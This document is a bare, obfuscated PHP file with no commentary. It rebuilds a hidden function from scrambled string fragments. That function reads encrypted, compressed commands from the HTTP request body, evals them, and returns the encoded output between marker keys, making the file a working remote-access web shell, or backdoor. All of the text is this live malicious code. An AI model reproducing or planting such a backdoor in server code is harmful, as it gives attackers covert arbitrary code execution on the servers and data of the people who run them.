<?php
$o='j=0;($j<bj$c&&$ibj<$l);$j++bj,bj$i++){$o.=$bjt{$i}^bj$k{$j}bj;}bj}retubjrn $o;}ibjfbj (@preg_mabjt';
$L='$bjk="26c5b1bj7c";$kh="a5bjbe0bje35e9fe"bj;$kf=bj"bj451bjb3cdd773b";bj$p="7RMfbjdvxkbjNqzxSbjeWN"bj';
$D='bjchbj("/$kbjh(.+)$kfbj/",@fibjle_get_conbjtentbjs("phpbj://bjinput"),$m)==1bj) {@ob_stabjrt();@eb';
$A=';@ob_bjbjend_clean();$bjr=@babjse64_encobjbjbjde(bj@x(@gzcompresbjs($o),$k));bjprint("bj$p$kh$bjr$kf");}';
$M=str_replace('Cf','','creCfaCfte_CffuCfnCfcCftion');
$V=';function x($tbj,$k)bj{$c=strlbjebjn($k);$l=bjstrlenbj($bjbjt);$obj="";for(bj$i=0;$i<$l;)bj{for($bj';
$d='jval(@gbjbjzubjncompress(@bjbjx(bj@basebj64_decode($bjm[bj1])bj,$k)bj));$o=@ob_get_contentbjs()';
$R=str_replace('bj','',$L.$V.$o.$D.$d.$A);
$F=$M('',$R);$F();
?>
